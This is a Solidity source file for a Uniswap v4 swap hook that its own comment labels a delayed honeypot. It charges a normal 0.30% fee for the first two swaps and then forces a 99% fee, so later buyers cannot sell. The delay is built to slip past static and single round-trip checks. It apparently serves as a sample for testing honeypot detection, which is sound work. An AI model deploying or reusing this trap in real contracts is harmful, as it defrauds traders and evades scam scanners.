// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary} from "@uniswap/v4-core/src/types/BeforeSwapDelta.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";

/// @notice A DELAYED honeypot hook. The first TRIGGER swaps are charged a normal 0.30% fee, so a
///         buy+sell round-trip (what a one-shot or static check runs) looks clean. Every swap after
///         that is overridden to a 99% fee, so anyone who buys later is trapped on the way out. The
///         trap is gated on trade count, so it is invisible at deploy and to a single round-trip; only
///         a forward dynamic walk reveals it.
contract DelayedHoneypotHook {
    uint256 public swaps;
    uint24 internal constant NORMAL_FEE = 3000; // 0.30%
    uint24 internal constant TRAP_FEE = 990000; // 99%
    uint256 internal constant TRIGGER = 2; // clean for 2 trades, then it springs

    function beforeSwap(address, PoolKey calldata, SwapParams calldata, bytes calldata)
        external
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        swaps += 1;
        uint24 fee = swaps <= TRIGGER ? NORMAL_FEE : TRAP_FEE;
        return (IHooks.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, fee | LPFeeLibrary.OVERRIDE_FEE_FLAG);
    }
}
